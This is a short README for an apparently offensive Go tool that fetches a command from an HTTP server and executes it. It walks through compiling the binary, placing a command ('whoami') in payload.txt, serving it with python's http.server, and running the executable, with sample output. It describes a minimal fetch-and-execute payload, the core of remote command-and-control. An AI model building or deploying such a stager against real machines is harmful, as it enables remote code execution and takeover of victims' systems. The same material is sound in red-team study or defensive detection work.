# Golang http get request payload

A really lame example of a simple http get request fetch and execute payload

## Compile the golang binary

```
go build http-payload-ex.go
```

Modify the payload server location before compiling

## Setup payload on server

```
echo -n "whoami" > payload.txt
```

The payload to be executed (Make sure it has no newlines)

```
python -m http.server 8080
```

Start python http server

## Run the executable

```
./http-payload-ex
Running command: whoami
sneakerhax
```


